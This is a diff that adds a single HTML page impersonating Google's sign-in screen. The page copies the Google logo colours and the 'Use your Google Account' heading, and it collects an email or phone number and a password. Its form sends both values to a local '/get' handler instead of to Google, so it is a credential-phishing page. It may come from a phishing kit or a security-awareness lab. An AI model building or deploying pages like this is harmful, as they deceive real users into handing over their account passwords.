@@ -1,0 +1,101 @@
+<!DOCTYPE HTML>
+<html>
+<head>
+  <title>Google Sign In</title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <style>
+    body {
+      font-family: 'Roboto', sans-serif;
+      background-color: #f2f2f2;
+      margin: 0;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+    }
+    .container {
+      background-color: #fff;
+      padding: 40px;
+      border-radius: 10px;
+      box-shadow: 0 10px 20px rgba(0, 0, 0, 0.1);
+      width: 350px;
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      position: relative; /* Added position relative */
+    }
+    h3 {
+      color: #202124;
+      text-align: center;
+      margin-bottom: 20px;
+    }
+    form {
+      text-align: center;
+      display: flex;
+      flex-direction: column;
+      align-items: stretch;
+      width: 100%;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 12px 10px;
+      margin: 8px 0;
+      border: 1px solid #d3d3d3;
+      border-radius: 5px;
+      box-sizing: border-box;
+      background-color: #f1f1f1;
+    }
+    input[type="submit"] {
+      background-color: #1a73e8;
+      color: white;
+      padding: 14px 20px;
+      border: none;
+      border-radius: 5px;
+      cursor: pointer;
+      font-size: 16px;
+      transition: background-color 0.3s;
+      width: auto; /* Adjusted width */
+      align-self: flex-end; /* Moved button to the side */
+    }
+    input[type="submit"]:hover {
+      background-color: #0d47a1;
+    }
+    .google-logo {
+      font-size: 48px;
+      margin-bottom: 20px;
+      font-weight: bold;
+      color: #4285f4;
+      white-space: nowrap; /* Prevents line break */
+    }
+    .create-account-button {
+      font-size: 16px;
+      font-weight: bold;
+      color: #1a73e8;
+      cursor: pointer;
+      position: absolute; /* Position absolutely */
+      bottom: 50px; /* Distance from bottom */
+      left: 20px; /* Distance from left */
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <span class="google-logo">
+      <span style="color: #4285f4;">G</span>
+      <span style="color: #ea4335;">o</span>
+      <span style="color: #fbbc05;">o</span>
+      <span style="color: #4285f4;">g</span>
+      <span style="color: #34a853;">l</span>
+      <span style="color: #ea4335;">e</span>
+    </span>
+    <h3>Use your Google Account</h3>
+    <form action="/get">
+      <input type="text" id="name" name="name" placeholder="Email or phone"><br>
+      <input type="password" id="password" name="password" placeholder="Password"><br><br>
+      <input type="submit" value="Next">
+    </form>
+    <span class="create-account-button">Create account</span>
+  </div>
+</body>
+</html>
